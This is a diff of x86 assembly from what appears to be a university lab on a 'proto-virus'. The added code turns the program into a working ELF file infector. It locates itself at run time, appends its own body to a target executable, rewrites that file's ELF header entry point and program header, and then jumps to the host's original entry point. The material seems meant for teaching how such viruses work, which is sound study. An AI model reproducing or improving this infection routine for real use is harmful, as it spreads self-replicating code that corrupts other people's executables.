@@ -77,7 +77,10 @@ _start:
 	print virus_msg, 16
 
 	;open a file called ELFexec2cpy
-		open FileName, RDWR, 0777
+		call get_my_loc
+		sub ecx, next_i-FileName
+		mov dword [ebp-4], ecx
+		open dword [ebp-4], RDWR, 0777
 		cmp eax, -1
 		je error_occured
 	
@@ -92,10 +95,13 @@ _start:
 		mov dword [ebp-8], eax
 
 	;infecting ELFexec with this very code
-	    mov ecx, virus_end       ; copy virus_end address
-	    sub ecx, _start       ; copy virus_end address
+	    mov edx, virus_end       ; copy virus_end address
+	    sub edx, _start       ; copy virus_end address
 
-	    write dword [ebp-4], _start, ecx
+	    call get_my_loc
+	    sub ecx, next_i-_start
+	    mov dword [ebp-80], ecx
+	    write dword [ebp-4], dword [ebp-80], edx
 
 
 	;copy yhe elf header to the stack
@@ -103,11 +109,8 @@ _start:
 		mov esi, ebp
 		sub esi, 60							;52+4+4
 		read dword [ebp-4], esi, 52
-		;add esi, 24
 
-		;sub ecx, 4
 		lseek dword [ebp-4], -4, SEEK_END
-		;lseek dword [ebp-4], 0, SEEK_SET
 		add esi, 24
 		write dword [ebp-4], esi, 4
 		sub esi, 24
@@ -117,9 +120,6 @@ _start:
 		;add ebx, 223h
 		add ebx, dword [ebp-8]
 		mov dword [esi+24], ebx
-		;write STDOUT, esi, 4
-		;swrite STDOUT, _start, 4
-		;write STDOUT, esi, 52
 
 	;copy the new elf header to the exec file
 		lseek dword [ebp-4], 0, SEEK_SET
@@ -128,52 +128,24 @@ _start:
 		write dword [ebp-4], esi, 52
 
 
-	;load second program header
-	;mov ebx, 
-	;lseek dword [ebp-4], 0x1c, SEEK_SET
-	;read dword [ebp-4], dword [esi-4], 4
-	;lseek dword [ebp-4], dword [esi-4], SEEK_SET
-	;lseek dword [ebp-4], 0x20, SEEK_CUR
-	;lseek dword [ebp-4], 0x10, SEEK_CUR
-	;mov ebx, dword [esi-4]
-	;add ebx, 0x20
-	;add ebx, 0x10
-	;lseek dword [ebp-4], ebx, SEEK_SET
-	;lseek dword [ebp-4], 100, SEEK_SET
-	;sub esi, 4
-	;read dword [ebp-4], esi, 4
-	;add esi, 4
-	;mov edx, dword [ebp-8]
-	;add dword [esi-4], edx
 	lseek dword [ebp-4], 100, SEEK_SET
 	sub esi, 4
 	mov dword [esi], 0x00000f85
 	write dword [ebp-4], esi, 4
 	write dword [ebp-4], esi, 4
-	;add esi, 4
-
-	;lseek dword [ebp-4], -8, SEEK_CURR
-	;write dword [ebp-4], esi, 52
-
-
-	;add dword [ebx]
-
-	
-	sub esi, 32
 
 
 	close dword [ebp-4]
 	mov eax, 1
-	jmp VirusExit
+		call get_my_loc
+		sub ecx, next_i-PreviousEntryPoint
+
+		jmp dword [ecx]
 
 	error_occured:
 		print error_msg, 18
 		mov eax, 0
 
-		call get_my_loc
-		sub ecx, next_i-PreviousEntryPoint
-
-		jmp dword [ecx]
 ; You code for this lab goes here
 
 VirusExit:
@@ -187,8 +159,6 @@ FileName:	db "ELFexec2cpy", 0
 OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
 Failstr:    db "perhaps not", 10 , 0
 virus_msg:    db "This is a virus", 10 , 0
-
-elf_magic:    db "ELF", 0
 error_msg:    db "An error occured!", 10, 0
 
 get_my_loc:
@@ -203,6 +173,8 @@ real_checkELF:
 	mov ebp, esp
 
 	sub esp, 4
+	lseek dword [ebp+8], 0, SEEK_SET
+
 	read dword [ebp+8], esp, 4
 	mov ecx, ebp
 	sub ecx, 3
